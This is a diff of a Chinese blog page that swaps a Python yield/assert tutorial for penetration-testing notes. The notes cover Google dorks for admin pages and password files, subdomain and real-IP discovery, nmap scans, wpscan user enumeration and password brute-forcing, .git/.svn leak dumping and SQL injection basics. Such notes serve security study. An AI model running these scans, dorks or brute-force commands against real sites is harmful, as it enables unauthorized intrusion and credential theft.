-<h4 id="示例-5：yield-from（委托生成器）">示例 5：<code>yield from</code>（委托生成器）</h4>
-<p><code>yield from</code> 用于将生成器的控制权委托给另一个生成器。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sub_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_generator</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;Start&#x27;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> sub_generator()</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&#x27;End&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用生成器</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> main_generator():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure>
-<p>输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">End</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a>                              查询到的邮箱名前几位隐蔽</p>
+<p><a href="https://whois.aizhan.com/reverse-whois/">https://whois.aizhan.com/reverse-whois/</a></p>
+</blockquote>
+<h3 id="备案号">备案号</h3>
+<p>网页最下方通常有备案号,通过备案号查询该公司旗下其他域名或资产</p>
 <ul>
-<li><code>yield from</code> 可以简化生成器的嵌套调用。</li>
+<li>接口</li>
 </ul>
-<hr>
-<h3 id="yield-与-return-的区别"><strong>yield 与 return 的区别</strong></h3>
+<blockquote>
+<p><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p>
+<p><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p>
+<p><a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p>
+</blockquote>
+<h3 id="子域名">子域名</h3>
+<h4 id="google-hacking">google hacking</h4>
+<ul>
+<li>语法</li>
+</ul>
 <table>
 <thead>
 <tr>
-<th>特性</th>
-<th><code>yield</code></th>
-<th><code>return</code></th>
+<th>字符</th>
+<th>注释</th>
+<th>例子</th>
+<th>注释</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>返回值</td>
-<td>每次生成一个值，函数暂停</td>
-<td>返回一个值，函数结束</td>
+<td>intext</td>
+<td>寻找正文中含有关 键字的网页</td>
+<td>intext：后台登录</td>
+<td>将只返回正文中包含“后台登录”的网页</td>
 </tr>
 <tr>
-<td>状态保持</td>
-<td>函数状态会被保存</td>
-<td>函数状态不会被保存</td>
+<td>intitle</td>
+<td>寻找标题中含有关 键字的网页</td>
+<td>intitle：后台登录</td>
+<td>将只返回标题中包含“后台 登录”的网页，intitle：后台登录密码将返回标题中 包含“后台登录而正文中包 含密码的网页</td>
 </tr>
 <tr>
-<td>适用场景</td>
-<td>生成器函数</td>
-<td>普通函数</td>
+<td>allinitle</td>
+<td>用法和intitle类 似，只不过可以指 定多个词</td>
+<td>alltitle：后台登录 管理员</td>
+<td>将返回标题中包含“后台登录”和“管理员”的网页</td>
 </tr>
 <tr>
-<td>内存占用</td>
-<td>惰性求值，节省内存</td>
-<td>一次性返回所有结果，占用内存</td>
+<td>inurl</td>
+<td>将返回ur中含有关 键词的网页</td>
+<td>inurl:Login</td>
+<td>将返回ur1中含有Login 的网页</td>
+</tr>
+<tr>
+<td>allinurl</td>
+<td>用法和inurl类似， 只不过可以指定多 个词 n</td>
+<td>allinurl:Login admin</td>
+<td>将返回ur1中含有Login 和admin的网页</td>
+</tr>
+<tr>
+<td>site</td>
+<td>指定访问的站点</td>
+<td>site:baidu.com inurl:Login</td>
+<td>将只在baidu.com中查找 urI中含有Login的网页</td>
+</tr>
+<tr>
+<td>filetype</td>
+<td>指定访问的文件类 型</td>
+<td>site:baidu.com filetype:pdf</td>
+<td>将只返回baidu.com站点 上文件类型为pdf的网页</td>
+</tr>
+<tr>
+<td>link</td>
+<td>指定链接的网页</td>
+<td>link:www.baidu.com</td>
+<td>将返回所有包含指向 www.baidu.com的网页</td>
+</tr>
+<tr>
+<td>related</td>
+<td>相似类型的网页</td>
+<td>related:www.xjtu.edu.cn</td>
+<td>将返回与 www.xjtu.edu.cn相似的 页面，相似指的是网页的布局相似</td>
+</tr>
+<tr>
+<td>info</td>
+<td>返回站点的指定信 意</td>
+<td>info:www.baidu.com corn</td>
+<td>将返回百度的一些信息</td>
+</tr>
+<tr>
+<td>define</td>
+<td>返回某个词语的定 发</td>
+<td>define:Hacker</td>
+<td>将返回关于 Hacker的定义</td>
+</tr>
+<tr>
+<td>cache</td>
+<td>网页快照，谷歌将 返回给你它存储下 莱的房使货</td>
+<td>cache:www.hackingspirits.com guest</td>
+<td>将返回指定网站的缓存，并 且正文中含有guest</td>
 </tr>
 </tbody>
 </table>
-<hr>
-<h3 id="总结"><strong>总结</strong></h3>
 <ul>
-<li><code>yield</code> 是 Python 中实现生成器的关键，适合处理大量数据或需要惰性求值的场景。</li>
-<li>生成器函数通过 <code>yield</code> 逐步返回值，并保持函数状态，直到生成所有值。</li>
-<li><code>yield from</code> 可以简化生成器的嵌套调用。</li>
+<li>示例</li>
 </ul>
-<h2 id="assert">assert</h2>
-<p><code>assert</code> 是 Python 中的一个关键字，用于调试和测试代码。它的作用是检查某个条件是否为真，如果条件为假，则会触发 <code>AssertionError</code> 异常。<code>assert</code> 通常用于确保程序在某个关键点的状态符合预期，如果不符合，则立即停止程序并抛出错误。</p>
-<hr>
-<h3 id="assert-的基本语法"><strong>assert 的基本语法</strong></h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> condition, message</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong><code>condition</code></strong>：需要检查的条件表达式。如果为 <code>True</code>，程序继续执行；如果为 <code>False</code>，则抛出 <code>AssertionError</code>。</li>
-<li><strong><code>message</code></strong>（可选）：当条件为 <code>False</code> 时，抛出的异常信息。如果未提供，则使用默认的 <code>AssertionError</code>。</li>
-</ul>
-<hr>
-<h3 id="assert-的作用"><strong>assert 的作用</strong></h3>
-<ol>
-<li>
-<p><strong>调试工具</strong>：</p>
-<ul>
-<li>用于在开发阶段检查代码逻辑是否正确。</li>
-<li>如果条件不满足，程序会立即停止，方便定位问题。</li>
-</ul>
-</li>
-<li>
-<p><strong>测试工具</strong>：</p>
-<ul>
-<li>在单元测试中，用于验证函数的输出是否符合预期。</li>
-</ul>
-</li>
-<li>
-<p><strong>文档工具</strong>：</p>
-<ul>
-<li>通过 <code>assert</code> 可以清晰地表达代码的预期行为。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="assert-的示例"><strong>assert 的示例</strong></h3>
-<h4 id="示例-1：简单的-assert-用法">示例 1：简单的 assert 用法</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="keyword">assert</span> x == <span class="number">10</span>, <span class="string">&quot;x 应该等于 10&quot;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>如果 <code>x == 10</code> 为 <code>True</code>，程序继续执行。</li>
-<li>如果 <code>x == 10</code> 为 <code>False</code>，则抛出 <code>AssertionError</code>，并显示消息 <code>&quot;x 应该等于 10&quot;</code>。</li>
-</ul>
-<hr>
-<h4 id="示例-2：检查函数返回值">示例 2：检查函数返回值</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">assert</span> b != <span class="number">0</span>, <span class="string">&quot;除数不能为 0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> a / b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>, <span class="number">2</span>))  <span class="comment"># 输出: 5.0</span></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>, <span class="number">0</span>))  <span class="comment"># 触发 AssertionError: 除数不能为 0</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>在函数中使用 <code>assert</code> 可以确保输入参数的有效性。</li>
-</ul>
-<hr>
-<h4 id="示例-3：检查列表是否非空">示例 3：检查列表是否非空</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_list</span>(<span class="params">items</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(items) &gt; <span class="number">0</span>, <span class="string">&quot;列表不能为空&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line">process_list([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment"># 正常执行</span></span><br><span class="line">process_list([])         <span class="comment"># 触发 AssertionError: 列表不能为空</span></span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="assert-的注意事项"><strong>assert 的注意事项</strong></h3>
-<ol>
-<li>
-<p><strong>不要用于数据验证</strong>：</p>
-<ul>
-<li><code>assert</code> 主要用于调试和测试，不应该用于检查用户输入或外部数据。</li>
-<li>因为 Python 可以通过 <code>-O</code>（优化模式）运行，此时所有的 <code>assert</code> 语句会被忽略。</li>
-</ul>
-</li>
-<li>
-<p><strong>避免副作用</strong>：</p>
-<ul>
-<li><code>assert</code> 的条件表达式不应该包含有副作用的操作（如修改全局变量、调用函数等），因为在优化模式下这些操作会被跳过。</li>
-</ul>
-</li>
-<li>
-<p><strong>替代方案</strong>：</p>
-<ul>
-<li>对于数据验证或输入检查，应该使用 <code>if</code> 语句并手动抛出异常（如 <code>ValueError</code>、<code>TypeError</code> 等）。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="assert-与-if-的区别"><strong>assert 与 if 的区别</strong></h3>
 <table>
 <thead>
 <tr>
-<th>特性</th>
-<th><code>assert</code></th>
-<th><code>if</code></th>
+<th>语法</th>
+<th>注释</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>用途</td>
-<td>调试和测试</td>
-<td>通用条件判断</td>
+<td>inurl://admin/login.php</td>
+<td>查找管理员登录页面</td>
 </tr>
 <tr>
-<td>触发异常</td>
-<td>触发 <code>AssertionError</code></td>
-<td>需要手动抛出异常</td>
+<td>inurl:/phpmyadmin/index.php</td>
+<td>查找后台数据库管理页面</td>
 </tr>
 <tr>
-<td>优化模式</td>
-<td>在 <code>-O</code> 模式下会被忽略</td>
-<td>不受影响</td>
+<td>site:baidu.com inurl:Login</td>
+<td>只在baidu.com中查找url 中含有Login的网页</td>
 </tr>
 <tr>
-<td>适用场景</td>
-<td>检查内部逻辑是否正确</td>
-<td>检查用户输入或外部数据</td>
+<td>site:baidu.com filetype:pdf ed</td>
+<td>只返回baidu.com站点上 文件类型为pdf的网页</td>
+</tr>
+<tr>
+<td>link:www.baidu.com</td>
+<td>返回所有包含指向 www.baidu.com的网页</td>
+</tr>
+<tr>
+<td>related:www.1lhc.edu.cn</td>
+<td>返回与 www.11hc.edu.cn网页 布局相似的页面</td>
+</tr>
+<tr>
+<td>site:xx.comintext:管理site:xx.cominurl:login site:xx.comintitle:后台</td>
+<td>查找网站后台</td>
+</tr>
+<tr>
+<td>site:xx.com filetype:php site:xx.com filetype:asp site:xx.com filetype:jsp site:xx.com filetype:aspx</td>
+<td>查看服务器使用的程序</td>
+</tr>
+<tr>
+<td>site:xx.com inurl:file site:xx.com inurl:load</td>
+<td>查看上传漏洞</td>
 </tr>
 </tbody>
 </table>
-<hr>
-<h3 id="assert-的优化模式"><strong>assert 的优化模式</strong></h3>
-<p>Python 支持以优化模式运行脚本，此时所有的 <code>assert</code> 语句会被忽略。可以通过以下命令启用优化模式：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -O script.py</span><br></pre></td></tr></table></figure>
 <ul>
-<li>在优化模式下，<code>assert</code> 语句不会被执行，因此不能依赖它来实现关键逻辑。</li>
+<li>Index of目录发现</li>
 </ul>
-<hr>
-<h3 id="总结-2"><strong>总结</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index of /admin</span><br><span class="line">index of /passwd</span><br><span class="line">index of /password</span><br><span class="line">index of /mail</span><br><span class="line">&quot;index of /&quot; +passwd</span><br><span class="line">&quot;index of /&quot; +password.txt</span><br><span class="line">&quot;index of /&quot; +.htaccess</span><br><span class="line">&quot;index of /root&quot;</span><br><span class="line">&quot;index of /cgi-bin&quot;</span><br><span class="line">&quot;index of /logs&quot;</span><br><span class="line">&quot;index of /config&quot;</span><br></pre></td></tr></table></figure>
 <ul>
-<li><code>assert</code> 是一个强大的调试工具，用于检查代码逻辑是否符合预期。</li>
-<li>它适合在开发和测试阶段使用，但不适合用于生产环境中的数据验证。</li>
-<li>如果需要更健壮的输入检查，应该使用 <code>if</code> 语句并手动抛出异常。</li>
+<li>子域名查询</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:[域名]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接口查询</li>
+</ul>
+<blockquote>
+<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>
+<a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a><br>
+<a href="https://developers.virustotal.com/reference/domains-relationships">https://developers.virustotal.com/reference/domains-relationships</a><br>
+<a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a><br>
+<a href="https://www.nmmapper.com/sys/tools/subdomainfinder/">https://www.nmmapper.com/sys/tools/subdomainfinder/</a></p>
+</blockquote>
+<h4 id="网络空间测绘工具">网络空间测绘工具</h4>
+<table>
+<thead>
+<tr>
+<th>工具名称</th>
+<th>网址</th>
+<th>语法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FOFA</td>
+<td><a href="https://fofa.info/">https://fofa.info/</a></td>
+<td>domain=“[域名]”</td>
+</tr>
+<tr>
+<td>鹰图</td>
+<td><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></td>
+<td>domain=“[域名]”</td>
+</tr>
+<tr>
+<td>钟馗之眼</td>
+<td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td>
+<td>site:“[域名]”</td>
+</tr>
+<tr>
+<td>shodan</td>
+<td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td>
+<td>hostname:[域名]</td>
+</tr>
+</tbody>
+</table>
+<h4 id="SSL证书查询">SSL证书查询</h4>
+<blockquote>
+<p><a href="https://crt.sh/">https://crt.sh/</a></p>
+<p><a href="https://developers.facebook.com/tools/ct/search/">https://developers.facebook.com/tools/ct/search/</a></p>
+</blockquote>
+<h4 id="JS文件发现">JS文件发现</h4>
+<ul>
+<li>
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd JSFinder</span><br><span class="line">python JSFinder.py -u http://[域名]</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="聚合工具">聚合工具</h4>
+<p>OneForAll</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda active py39\</span><br><span class="line">cd OneForAll/</span><br><span class="line">python oneforall.py --target [域名] run</span><br><span class="line">(谷歌联网)</span><br><span class="line">(查看 ./results/[域名].csv)</span><br></pre></td></tr></table></figure>
+<h4 id="爆破">爆破</h4>
+<p>子域名挖掘机(主机D://渗透)</p>
+<h2 id="服务器信息">服务器信息</h2>
+<h3 id="IP收集">IP收集</h3>
+<h4 id="IP反查域名">IP反查域名</h4>
+<blockquote>
+<p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a><br>
+<a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a><br>
+<a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a><br>
+<a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
+</blockquote>
+<h4 id="域名查IP">域名查IP</h4>
+<p><a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a><br>
+<a href="https://ipchaxun.com/">https://ipchaxun.com/</a><br>
+<a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
+<h4 id="C段存活主机探测">C段存活主机探测</h4>
+<p>先旁注 后C段</p>
+<p>查找与目标服务器P处于同一个C段的服务器IP</p>
+<p>域名显示运营商是阿里云不是xxx机房之类，不用查</p>
+<ul>
+<li>nmap</li>
+</ul>
+<p>只能查出有没有开机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP www.example.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></figure>
+<ul>
+<li>脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./TxPortMap -i www.example.com/24 -p 80</span><br></pre></td></tr></table></figure>
+<h4 id="CDN">CDN</h4>
+<p>多地ping</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ping.chinaz.com/</span><br><span class="line">https://ping.aizhan.com/</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br></pre></td></tr></table></figure>
+<p>用各种多地ping的服务，查看对应P地址是否唯一</p>
+<ul>
+<li>国外访问</li>
+</ul>
+<blockquote>
+<p><a href="https://ping.sx/ping">https://ping.sx/ping</a></p>
+</blockquote>
+<p>有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过</p>
+<ul>
+<li>
+<p>查询子域名IP</p>
+</li>
+<li>
+<p>MX记录邮件服务</p>
+<p>​    MX记录是一种常见的查找IP的方式。如果网站在与wb相同的服务器和IP上托管自己的邮件服务器，那么原始服务器P将在MX记录中。</p>
+</li>
+<li>
+<p>查询历史DNS记录</p>
+</li>
+</ul>
+<blockquote>
+<p><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a><br>
+<a href="https://www.ip138.com/">https://www.ip138.com/</a></p>
+</blockquote>
+<p>真实ip可能是买DNS的前一个</p>
+<h3 id="端口收集">端口收集</h3>
+<p>一个电脑最多65525个端口,常见端口总结</p>
+<blockquote>
+<p><a href="https://edu.yijinglab.com/post/280">https://edu.yijinglab.com/post/280</a></p>
+</blockquote>
+<ul>
+<li>nmap</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 192.168.1.1</span><br><span class="line"></span><br><span class="line">A：全面扫描\综合扫描</span><br><span class="line">T4：扫描速度，共有6级，T0-T5</span><br><span class="line"></span><br><span class="line">不加端口则扫描默认端口，1-1024 + nmap-service</span><br><span class="line"></span><br><span class="line">单一主机扫描：</span><br><span class="line">nmap 192.168.1.2</span><br><span class="line"></span><br><span class="line">子网扫描：</span><br><span class="line">nmap 192.168.1.1/24</span><br><span class="line"></span><br><span class="line">多主机扫描：</span><br><span class="line">nmap 192.168.1.1 192.168.1.10</span><br><span class="line"></span><br><span class="line">主机范围扫描：</span><br><span class="line">nmap 192.168.1.1-100</span><br><span class="line"></span><br><span class="line">IP地址列表扫描：</span><br><span class="line">nmap –iL target.txt</span><br><span class="line"></span><br><span class="line">扫描除指定IP外的所有子网主机：</span><br><span class="line">nmap 192.168.1.1/24 --exclude 192.168.1.1</span><br><span class="line"></span><br><span class="line">扫描除文件中IP外的子网主机：</span><br><span class="line">nmap 192.168.1.1/24 --excludefile xxx.txt</span><br><span class="line"></span><br><span class="line">扫描特定主机上的80,21,23端口：</span><br><span class="line">nmap –p 80,21,23 192.168.1.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt</span><br><span class="line"></span><br><span class="line">-sS：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）</span><br><span class="line"></span><br><span class="line">优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高</span><br><span class="line">缺点：它需要root/administrator权限执行</span><br><span class="line"></span><br><span class="line">-Pn：扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</span><br><span class="line"></span><br><span class="line">-iL：导入需要扫描的列表</span><br></pre></td></tr></table></figure>
+<h3 id="网站信息">网站信息</h3>
+<h4 id="操作系统">操作系统</h4>
+<ul>
+<li>ping判断：windows的TTL值一般为128，Linux则为64。<br>
+TTL大于100的一般为windows,几十的一般为linux。</li>
+<li>nmap -o [ip/域名]</li>
+<li>windows大小写不敏感，1inux则区分大小写</li>
+</ul>
+<h4 id="网站服务、容器类型">网站服务、容器类型</h4>
+<ul>
+<li>F12查看响应头Server字段</li>
+<li>whatweb</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whateweb -v -a 3 [ip]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>wappalyzer插件</li>
+</ul>
+<p>apache,nginx,tomcat,IIS<br>
+通过容器类型、版本可考虑对应容器存在的漏洞（解析漏洞）</p>
+<h4 id="脚本类型">脚本类型</h4>
+<blockquote>
+<p>1.php<br>
+2.jsp<br>
+3.asp/aspx<br>
+4.python</p>
+</blockquote>
+<p>知道是什么语言才可以针对性的进行文件扫描、文件上传</p>
+<h4 id="数据库类型">数据库类型</h4>
+<blockquote>
+<p><a href="https://edu.yijinglab.com/post/298">https://edu.yijinglab.com/post/298</a></p>
+</blockquote>
+<h4 id="CMS识别">CMS识别</h4>
+<p>内容管理系统，用于网站内容文章管理。常见CMS:WordPress、Joomla、.Drupal、dedecms(织梦)、Discuz、phpcms等。</p>
+<ul>
+<li>CMS检测识别工具</li>
+</ul>
+<p>CMSeeK:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd CMSeek</span><br><span class="line">python TPscan.py</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>joomscan识别Joomla：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">joomscan -u http://192.168.233.187/</span><br></pre></td></tr></table></figure>
+<p>wpscan识别WordPress：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、刺探基础信息：</span><br><span class="line">wpscan --url http://www.example.com</span><br><span class="line"></span><br><span class="line">2、猜解后台用户名</span><br><span class="line">wpscan --url http://www.example.com --enumerate u</span><br><span class="line"></span><br><span class="line">3、使用字典暴破用户名admin的密码</span><br><span class="line">wpscan --url http://www.example.com -P password.txt -U admin </span><br><span class="line"></span><br><span class="line">4、扫描插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate p</span><br><span class="line"></span><br><span class="line">5、扫描易受攻击的插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate vp</span><br><span class="line"></span><br><span class="line">6、扫描所有插件</span><br><span class="line">wpscan --url http://www.example.com --enumerate ap</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>TPscan识别thinkphp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd TPscan</span><br><span class="line">python TPscan.py</span><br></pre></td></tr></table></figure>
+<h4 id="敏感文件">敏感文件</h4>
+<ul>
+<li>.git泄漏</li>
+</ul>
+<blockquote>
+<p>若存在.git泄漏，打开githack网站 <a href="https://githack.com/">https://githack.com/</a></p>
+<p>在网站上方的文本框中输入目标Git存储库的URL，例如<code>https://example.com/.git/</code></p>
+<p>点击<code>Generate link</code>按钮生成可下载存储库的链接。</p>
+<p>将生成的链接复制到浏览器地址栏中并打开。</p>
+<p>从打开的页面中下载压缩的Git存储库文件。</p>
+</blockquote>
+<ul>
+<li>.svn泄漏</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd SvnExploit</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn</span><br><span class="line"># 下载</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn --dump</span><br></pre></td></tr></table></figure>
+<ul>
+<li>目录扫描</li>
+</ul>
+<blockquote>
+<p>dirsearch -u [url]</p>
+<p>dir [url] /usr/share/wordlists/dirb/common.txt</p>
+<p>7kbscan(windows)</p>
+</blockquote>
+<h4 id="waf">waf</h4>
+<ul>
+<li>wafw00f</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wafw00f [url]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>nmap</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –p80,443 --script http-waf-detect ip</span><br><span class="line"></span><br><span class="line">nmap –p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></figure>
+<h3 id="自动化集成工具">自动化集成工具</h3>
+<ul>
+<li>灯塔</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd LinuxEnvConfig</span><br><span class="line"></span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">docker0的inet</span><br></pre></td></tr></table></figure>
+<ul>
+<li>EHole</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd D:\渗透\EHole\EHole_windows_amd64</span><br><span class="line">EHole_windows_amd64.exe -h</span><br><span class="line"></span><br><span class="line"># URL地址需带上协议,每行一个</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt</span><br><span class="line"># 支持单IP或IP段</span><br><span class="line">EHole_windows_amd64.exe finger -f 192.168.1.1/24</span><br><span class="line"># 结果输出至export.json文件</span><br><span class="line">EHole_windows_amd64.exe finger -l url.txt -json export.json</span><br></pre></td></tr></table></figure>
+<h1>漏洞挖掘</h1>
+<h2 id="SQL注入">SQL注入</h2>
+<h3 id="基础语法">基础语法</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查找</span><br><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">SELECT * FROM 表名</span><br><span class="line"># 删除</span><br><span class="line">DELETE FROM 表名称 WHERE 列名称 = 值</span><br><span class="line">DELETE * FROM 表名称</span><br><span class="line"># 更新</span><br><span class="line">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</span><br><span class="line"># 增加</span><br><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line"></span><br><span class="line"># 字符截取</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select mid(database(),1,1)</span><br><span class="line"># 截取结果中的值，从第一个字符开始，截取1个字符</span><br><span class="line">select substr(database(),1,1)</span><br><span class="line"></span><br><span class="line"># 左右字符</span><br><span class="line"># 返回当前数据库最左边的1个字符串</span><br><span class="line">select left(database(),1);</span><br><span class="line"># 返回当前数据库最右边的1个字符串</span><br><span class="line">select right(database(),1);</span><br><span class="line"></span><br><span class="line"># 字符ASCII</span><br><span class="line"># 结果为1或者0，也就是true or false</span><br><span class="line">select ascii(substr(database(),1,1))&gt;97;</span><br><span class="line">select ord(substr(database(),1,1))&gt;97;</span><br><span class="line"></span><br><span class="line"># 行数</span><br><span class="line"># 返回查询结果行数</span><br><span class="line">select count(username) from users;</span><br><span class="line"></span><br><span class="line">#合并</span><br><span class="line">select group_concat(a) from (select database() as a union select version() as a) as t;</span><br><span class="line"></span><br><span class="line"># 基础信息</span><br><span class="line"># 在sql语言中，and优先级大于or</span><br><span class="line">--+     注释符</span><br><span class="line">limit 0,1      从你表中的第一个数据开始，只读取一个</span><br><span class="line">order by      排序，判断字段数量，也就是表的列数</span><br><span class="line">union select  联合查询，连接前面语句，起着合并查询的作用</span><br><span class="line">group_concat  合并多行数据到一行</span><br><span class="line">version()    当前数据库版本</span><br><span class="line">database()   当前数据库</span><br><span class="line">@@datadir    数据库数据路径</span><br><span class="line">@@version_compile_os    操作系统版本</span><br></pre></td></tr></table></figure>
+<h3 id="系统表">系统表</h3>
+<p>在MySQL中，把information_schema看作是一个数据库，确切说是信息数据库。保存数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<blockquote>
+<ul>
+<li>SCHEMATA 表：提供了当前mysql实例中所有数据库的信息。<br>
+show databases; 的结果取之此表。</li>
+</ul>
+<p>Schema.name列：所有数据库名</p>
+<ul>
+<li>TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<br>
+show tables from schemaname; (schemaname为指定数据库名)的结果取之此表。</li>
+</ul>
+<p>Table.name列：所有表名<br>
+Table.schema列：来自哪个数据库</p>
+<ul>
+<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<br>
+show columns from schemaname.tablename; (schemaname为指定数据库名, tablename为指定数据库下的数据表名)的结果取之此表。</li>
+</ul>
+<p>Column_name列：所有列名<br>
+Table.name列：来自哪个表<br>
+Table.schema列：来自哪个数据库</p>
+</blockquote>
+<h3 id="判断是否有漏洞">判断是否有漏洞</h3>
+<p>根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。</p>
+<h3 id="类型">类型</h3>
+<blockquote>
+<p>按参数类型分类：<br>
+数字型<br>
+字符型<br>
+搜索型<br>
+按数据库返回结果分类：<br>
+回显注入<br>
+报错注入<br>
+盲注<br>
+基于布尔的盲注<br>
+基于时间的盲注<br>
+按注入点位置分类：<br>
+GET注入<br>
+POST注入<br>
+Cookie注入<br>
+Header注入<br>
+… …</p>
+</blockquote>
